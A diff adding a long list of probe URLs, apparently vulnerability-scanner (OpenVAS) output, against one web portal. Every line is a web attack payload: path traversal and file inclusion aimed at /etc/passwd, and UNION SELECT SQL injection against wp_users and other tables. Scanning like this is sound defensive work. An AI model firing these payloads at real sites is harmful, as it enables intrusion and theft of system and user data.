@@ -1,0 +1,340 @@
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/core/editor.php?editor_insert_bottom=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/viewheadline.php?id=-9' union select 1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/viewheadline.php?id=-9' union select 1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/core/editor.php?editor_insert_bottom=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/viewheadline.php?id=-9' union select 1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/about/viewheadline.php?id=-9' union select 1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/foundation/viewheadline.php?id=-9' union select 1,2,3,4,5,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 from wp_users--+
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//downloadfile.php?dwnfile=../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/esev2/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/esev/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cms/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/galilery/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//sublink.php?langval=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//complete-modules/modules/forcedownload/force_download.php?filename=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/ruubikcms/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cms/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//index.php?pg=1&d=../../../../../../../../../../../../../../../../../../
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/portix/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cms/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//extra/image.php?f=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/shop/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443//print.php?page=../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/index.php?action=template&template=../../../../../../../../../../../../../../../../../../etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/awiki/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/wiki/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-musiikkityo/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-perhetyo/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-diakoniatyo/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-rippikoulutyo/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/k-p-varhasnuorisotyo/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/keski-pori/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/musiikkitapahtumia/range.listevents/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/tapahtumatviikoittain/2016/07/27/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/uutisia/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/system/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/com_attachments/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/css/index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/DigitalScribe/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443//index.php?page=/etc/passwd
+URL       : https://dc4-web-portal.cityinthe.cloud:443/digitalscribe/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/scripts/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/cgi-bin/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235green/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/media/system/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/tapahtumakalenteri/week_listevents/2016/07/27/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/plugins/content/mavikthumbnails/mavikthumbnails/slimbox-mt1.2/css/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/css/tabs/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/templates/porievl2013v235blue/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/components/com_jevents/views/ext/assets/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
+URL       : https://dc4-web-portal.cityinthe.cloud:443/lavian-seurakunta/stuworkdisplay.php?ID=-1) UNION ALL SELECT 0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,2,3,4,5,6,7,8,9,10,11
